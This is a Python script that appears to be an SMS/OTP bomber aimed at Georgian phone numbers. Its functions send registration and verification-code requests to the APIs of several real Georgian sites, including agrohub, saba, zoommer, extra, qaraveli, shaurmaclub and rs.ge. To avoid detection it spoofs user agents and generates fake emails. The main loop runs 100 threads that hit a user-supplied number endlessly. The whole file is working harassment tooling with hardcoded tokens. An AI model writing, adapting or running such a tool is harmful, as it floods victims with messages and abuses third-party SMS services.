import requests
from user_agent import generate_user_agent
import random
import time
import string
import threading
    

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    domains = ["gmail.com", "mail.ru", "yahoo.com", "outlook.com"]
    return f"{name}@{random.choice(domains)}"
def get_real_looking_email():

    names = ["nika", "giorgi", "luka", "dato", "saba", "ana", "mari"]
    lastnames = ["beri", "gelash", "kapan", "maisur", "todua"]
    rand_name = random.choice(names) + "." + random.choice(lastnames)
    rand_num = str(random.randint(10, 999))
    return f"{rand_name}{rand_num}@gmail.com"
def agrohub(number):
    url = "https://api.agrohub.ge/v1/Account/user"
    payload = {
        "userName": f"995{number}"
    }

    token = ""

    headers = {
        "Host": "api.agrohub.ge",
        "User-Agent": generate_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json-patch+json", 
        "authorization": f"Bearer {token}",
        "os": "web",
        "Origin": "https://agrohub.ge",
        "Referer": "https://agrohub.ge/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    

    response = requests.post(url, json=payload, headers=headers)
    return response

def saba(number):
    clean_number = ''.join(filter(str.isdigit, number))
    if len(clean_number) > 9:
        clean_number = clean_number[-9:]

    session = requests.Session()
    new_email = get_real_looking_email()
    
    headers = {
        "Host": "web-api.saba.com.ge",
        "User-Agent": generate_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://saba.com.ge",
        "Referer": "https://saba.com.ge/",
    }

    try:
        reg_url = "https://web-api.saba.com.ge/Registration/users"
        reg_payload = {
            "firstName": "Nika",
            "lastName": "Beridze",
            "email": new_email,
            "password": "StrongPassword123!",
            "repeatedPassword": "StrongPassword123!",
            "mobile": clean_number 
        }
        
        reg_req = session.post(reg_url, json=reg_payload, headers=headers, timeout=10)
        
        time.sleep(2) 

        otp_url = "https://web-api.saba.com.ge/verification/mobile-otp"
        otp_payload = {
            "mobile": clean_number,
            "email": new_email
        }

        response = session.post(otp_url, json=otp_payload, headers=headers, timeout=10)
        return response
    except Exception as e:
        print(f"Saba Error: {e}")
        return None
def zoomer(number):
    url = "https://api.zoommer.ge/v1/Account/user"
    payload = {"username":f"995{number}"}



    token = "z1g2gmCzOsl9f8iY/AOHPcyT4fQBpz9s9B"
    headers = {
        "Host": "api.zoommer.ge",
        "User-Agent": generate_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "ka",
        "Content-Type": "application/json",
        "os": "web",
        "authorization": f"Bearer {token}",
        "Origin": "https://zoommer.ge",
        "Referer": "https://zoommer.ge/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    response = requests.post(url, json=payload, headers=headers)
    return response 
def extra(number):
    url = "https://identity.extra.ge/api/Account/register"
   
    payload = {"firstName":"DsevenFex","lastName":"DsevenFex","emailOrPhone":number,"contactStatus":True}
    headers = {
    "Host": "identity.extra.ge",
    "User-Agent": generate_user_agent(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": "https://extra.ge",
    "Referer": "https://extra.ge/",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site"
}

    response = requests.post(url, json=payload, headers=headers)
    return response 
def veli(number):



    url = ""
   
    payload = {"email":   generate_random_email(),"username":"DsevenFex","phone":f'+995{number}',"password":"!DsevenFex111","password2":"!DsevenFex111","marketing_subscription":1}
    
    headers = {
    "Host": "veli.store",
    "User-Agent": generate_user_agent(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ka",
    "Content-Type": "application/json",
    "source": "web",
    "client-id": "aq chasvi <3",
    "Origin": "https://veli.store",
    "Referer": "https://veli.store/?show_modal=register",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin"
}

    response = requests.post(url, json=payload, headers=headers)
    return response 
def qartveli(number):
    url = "https://www.qaraveli.ge/interactive.php"
   
    payload = f"f=getPhoneCode&p={number}"
    
    headers = {
    "Host": "www.qaraveli.ge",
    "User-Agent":  generate_user_agent(),
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://www.qaraveli.ge",
    "Connection": "keep-alive",
    "Referer": "https://www.qaraveli.ge/ka/login?return=ka%2Fregister",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin"
}

    response = requests.post(url, data=payload, headers=headers)   
    return response
def shaurmaclub(number):
    url = "https://shaurmaclub.ge/wp-admin/admin-ajax.php"

    payload = f"action=generate_code&phone_number={number}"
    headers = {
        "host": "shaurmaclub.ge",
        "connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": generate_user_agent(),
        "accept": "*/*",
        "sec-ch-ua": "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "origin": "https://shaurmaclub.ge",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://shaurmaclub.ge/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "cookie": "z1g2gmCzOsl9f8iY/AOHPcyT4fQBpz9s9B"
    }

    response = requests.post(url, data=payload, headers=headers)
    return response
def rsge(number):
    url = "https://videocall.rs.ge/WebServices/hsUser.ashx/ConfirmContact"

    payload = {
        "contact": number,
        "contactType": 0
    }
    headers = {
        "host": "videocall.rs.ge",
        "connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": generate_user_agent(),
        "accept": "application/json, text/javascript, */*; q=0.01",
        "sec-ch-ua": "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "origin": "https://videocall.rs.ge",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://videocall.rs.ge/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    }

    response = requests.post(url, json=payload, headers=headers)
    return response
def main():
    apis = [agrohub,qartveli,saba,zoomer,  rsge, shaurmaclub,  extra]
    # apis = [qartveli]
    phone_number = input('[!] Number: ')
    threads_count = 100

    def worker():
        while True:
            selected_api = random.choice(apis)
            try:
                response = selected_api(phone_number)
                print(f"[{time.strftime('%H:%M:%S')}] {selected_api.__name__} -> {response.status_code}")
            except:
                pass
            time.sleep(0.1)

    for _ in range(threads_count):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    print(f"[*] Running on {threads_count} threads. Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Stopping all threads...")

if __name__ == "__main__":
    main()
